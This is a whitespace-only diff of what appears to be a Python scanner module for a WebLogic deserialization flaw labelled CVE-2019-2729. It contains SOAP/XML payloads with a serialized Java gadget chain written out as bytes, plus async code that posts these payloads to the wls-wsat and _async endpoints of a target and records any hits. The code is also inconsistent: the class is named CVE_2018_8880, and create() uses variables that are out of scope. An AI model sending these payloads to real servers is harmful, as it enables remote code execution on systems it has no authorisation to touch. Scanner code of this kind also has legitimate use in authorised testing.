@@ -10,10 +10,10 @@ payload1 = '''
 </void>
 </array>
    </java>
-    </work:WorkContext>
+	</work:WorkContext>
    </soapenv:Header>
    <soapenv:Body>
-      <asy:onAsyncDelivery/>
+	  <asy:onAsyncDelivery/>
    </soapenv:Body>
 </soapenv:Envelope>
 '''
@@ -25,7 +25,7 @@ payload2 = '''
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
 <java>
 <array method="forName"><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>
-                    <array class="byte" length="3478">
+					<array class="byte" length="3478">
 <void index="0"><byte>-84</byte></void>
 <void index="1"><byte>-19</byte></void>
 <void index="2"><byte>0</byte></void>
@@ -3508,20 +3508,20 @@ payload2 = '''
 </void>
 </array>
    </java>
-    </work:WorkContext>
+	</work:WorkContext>
    </soapenv:Header>
    <soapenv:Body>
-      <asy:onAsyncDelivery/>
+	  <asy:onAsyncDelivery/>
    </soapenv:Body>
 </soapenv:Envelope>
 '''
 
 def create(text):
-    vulns.append("CVE-2019-2729")
-    data["CVE-2019-2729"] = {"data": text}
-    self.mkdir(["CVE-2019-2729"])
-    with open("scan-outputs/CVE-2019-2729/"+self.ping.host+".ini", "w") as fp:
-        fp.write(text)
+	vulns.append("CVE-2019-2729")
+	data["CVE-2019-2729"] = {"data": text}
+	self.mkdir(["CVE-2019-2729"])
+	with open("scan-outputs/CVE-2019-2729/"+self.ping.host+".ini", "w") as fp:
+		fp.write(text)
   
 from .scan import Scan
 import aiohttp
@@ -3529,21 +3529,21 @@ import time
 import traceback
 
 class CVE_2018_8880(Scan):
-    async def scan(self, session : aiohttp.ClientSession):
-        vulns = []
-        data = {}
-        try:
-            async with session.post(**{"url":str(self.ping.url)+"wls-wsat/CoordinatorPortType"}, data=payload1, **self.request_args, timeout=2) as resp:
-                if resp.status == 200:
-                    text=(await resp.text())
-                    if 'uid' in text:create(text)
-            async with session.post(**{"url":str(self.ping.url)+"_async/AsyncResponseService"}, data=payload2, **self.request_args, timeout=2) as resp:
-                if resp.status == 200:
-                    async with session.post(**{"url":str(self.ping.url)+"_async/favicon.ico"}, **self.request_args, timeout=2) as resp:
-                        if resp.status == 200:
-                            text=(await resp.text())
-                            if 'Vulnerable' in text: create(text)
-        except Exception as e:
-            pass
+	async def scan(self, session : aiohttp.ClientSession):
+		vulns = []
+		data = {}
+		try:
+			async with session.post(**{"url":str(self.ping.url)+"wls-wsat/CoordinatorPortType"}, data=payload1, **self.request_args, timeout=2) as resp:
+				if resp.status == 200:
+					text=(await resp.text())
+					if 'uid' in text:create(text)
+			async with session.post(**{"url":str(self.ping.url)+"_async/AsyncResponseService"}, data=payload2, **self.request_args, timeout=2) as resp:
+				if resp.status == 200:
+					async with session.post(**{"url":str(self.ping.url)+"_async/favicon.ico"}, **self.request_args, timeout=2) as resp:
+						if resp.status == 200:
+							text=(await resp.text())
+							if 'Vulnerable' in text: create(text)
+		except Exception as e:
+			pass
 
-        return vulns, data
+		return vulns, data
